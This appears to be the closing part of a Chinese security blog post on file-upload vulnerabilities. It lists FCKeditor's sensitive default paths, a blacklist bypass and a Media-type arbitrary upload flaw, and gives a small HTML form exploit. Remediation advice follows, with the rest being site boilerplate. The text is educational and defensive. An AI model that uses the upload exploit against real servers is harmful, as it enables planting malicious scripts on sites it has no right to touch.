+<h3 id="FCKeditor编辑器漏洞（FCKeditor现已更名为CKEditor）"><a href="#FCKeditor编辑器漏洞（FCKeditor现已更名为CKEditor）" class="headerlink" title="FCKeditor编辑器漏洞（FCKeditor现已更名为CKEditor）"></a>FCKeditor编辑器漏洞（FCKeditor现已更名为CKEditor）</h3><h4 id="FCKeditor简介"><a href="#FCKeditor简介" class="headerlink" title="FCKeditor简介"></a>FCKeditor简介</h4><p>FCKeditor是一个开源，所见即所得的文字编辑器，可以适用于asp&#x2F;php&#x2F;aspx&#x2F;jsp等脚本类型网站。</p>
+<h4 id="FCKeditor编辑器漏洞"><a href="#FCKeditor编辑器漏洞" class="headerlink" title="FCKeditor编辑器漏洞"></a>FCKeditor编辑器漏洞</h4><h5 id="敏感信息暴露"><a href="#敏感信息暴露" class="headerlink" title="敏感信息暴露"></a>敏感信息暴露</h5><p>FCKeditor目录存在一些敏感文件，如果这些文件不删除，攻击者就会快速得到一些敏感信息</p>
+<ul>
+<li>查看版本信息<br>&#x2F;FCKeditor&#x2F;editor&#x2F;dialog&#x2F;fck_about.html</li>
+<li>默认上传页面<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;browser.html<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;test.html<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;upload&#x2F;test.html<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;test.html<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;uploadtest.html</li>
+<li>其他敏感文件<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;php&#x2F;connector.php</li>
+</ul>
+<h5 id="黑名单策略错误"><a href="#黑名单策略错误" class="headerlink" title="黑名单策略错误"></a>黑名单策略错误</h5><ul>
+<li>影响版本： &lt;&#x3D;2.4.3</li>
+<li>原因<br>黑名单过滤了一些常见的文件扩展名，但忽略了asa,cer等未知风险扩展名</li>
+<li>利用<br>攻击者可直接上传asa,cer等危险脚本文件</li>
+</ul>
+<h5 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h5><ul>
+<li><p>影响版本： &lt;&#x3D;2.4.2</p>
+</li>
+<li><p>原因<br>服务端程序获取用户上传的文件的文件类型，并判断是否是File,Image,Flash,Media中的一种，如果是，将会取得该文件类型允许的上传格式（后缀名），但是它在格式配置文件中却未定义Media文件类型的允许或不允许上传的格式，导致可以上传任意类型文件</p>
+</li>
+<li><p>利用</p>
+<ul>
+<li><p>使用burp拦截上传请求数据，将请求地址改为upload.php?Type&#x3D;Media,然后上传</p>
+</li>
+<li><p>通过构造HTML表单</p>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tiitle</span><span class="token punctuation">></span></span>FCKeditor任意文件上传exp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tiitle</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://1.1.1.1/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file_upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+</li>
+<li><p>注：<br>FCKeditor中还存在其他的漏洞，如：asp.net二次上传、建立畸形文件夹等漏洞</p>
+</li>
+</ul>
+<h2 id="修复上传漏洞"><a href="#修复上传漏洞" class="headerlink" title="修复上传漏洞"></a>修复上传漏洞</h2><h3 id="上传漏洞形成的最终原因主要有"><a href="#上传漏洞形成的最终原因主要有" class="headerlink" title="上传漏洞形成的最终原因主要有"></a>上传漏洞形成的最终原因主要有</h3><ul>
+<li>目录过滤不严，攻击者可能建立畸形目录</li>
+<li>文件未重命名，攻击者可能利用web容器解析漏洞</li>
+</ul>
+<h3 id="在代码阶段解决上传漏洞的步骤"><a href="#在代码阶段解决上传漏洞的步骤" class="headerlink" title="在代码阶段解决上传漏洞的步骤"></a>在代码阶段解决上传漏洞的步骤</h3><ul>
+<li>1.接收文件名及其文件临时路径</li>
+<li>2.获取扩展名与白名单做对比，如果扩展名没有命中白名单则程序退出</li>
+<li>3.对文件进行重命名<br>  注：只能在代码阶段基本解决上传漏洞，但不能说绝对防御，因为没有绝对的安全<ul>
+<li>例：假如web容器是apache,apache默认不支持识别rar文件，因此我们可以利用apache解析漏洞，上传一个名为xxx.php.rar的含有恶意代码的文件，该文件就会以php脚本来解析。</li>
+</ul>
+</li>
+</ul>
+<h3 id="注：安全是一个整体，不仅要在程序编写上注意，在服务器配置，web容器配置上也要注意"><a href="#注：安全是一个整体，不仅要在程序编写上注意，在服务器配置，web容器配置上也要注意" class="headerlink" title="注：安全是一个整体，不仅要在程序编写上注意，在服务器配置，web容器配置上也要注意"></a>注：安全是一个整体，不仅要在程序编写上注意，在服务器配置，web容器配置上也要注意</h3>
+      </div>
+      <div class="post-tags-categories">
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>txjg</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2021/12/15/上传漏洞/" target="_blank" title="上传漏洞">https://ntexjg.github.io/2021/12/15/上传漏洞/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+    
+
+    <!-- 打赏 -->
+    
+
+    <!-- 分享 -->
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>本文目录</span>
+        
+          <div class="toc-open-close">本文目录</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
+
+<script>
+  function closeToc(init) {
+    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
+    $(".toc-content").css({'width': 0});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+  };
+  function openToc() {
+    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
+    $(".toc-content").css({'width': '300px'});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+  }
+  function openBtnClickFn () {
+    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+    let open = eval('' || 'true');
+    openOrCloseBtn.click(function() {
+      if (open) {
+        closeToc();
+        open = false;
+      } else {
+        openToc();
+        open = true;
+      }
+    });
+  };
+  openBtnClickFn();
+  initCloseTocWidth(true);
+
+  function initCloseTocWidth(init) {
+    if (window.innerWidth >= 992) {
+      let isClose = false;
+      isClose && closeToc(init)
+    }
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    $(".toc-aside").css({'transition': 'no'});
+  })
+  document.addEventListener('pjax:complete', function () {
+    openBtnClickFn();
+  })
+  
+</script>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '#ffffff';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2019 - 2022</p>
+
+          </div>
+        
+      
+        
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+  left: -66px !important;
+}
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+  left: 0px !important;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="netease"
+  type="playlist"
+  id="489221140"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <!-- 背景彩带 -->
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script>
+
+<script>
+  var headerEl = 'h2, h3, h4, h5, h6',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -80,
+    headingsOffset: -($(window).height() * 0.4 - 45),
+    positionFixedSelector: '.toc-main',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 100) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('toc-aside')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  }
+</style> 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const headerMenuTransparent = true;
+    if (!headerMenuTransparent) { return; }
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.css">
+  <script src="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+   
+    <script src="/js/cursor/clicklove.js"></script> 
+  
+
+
+
+
+
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
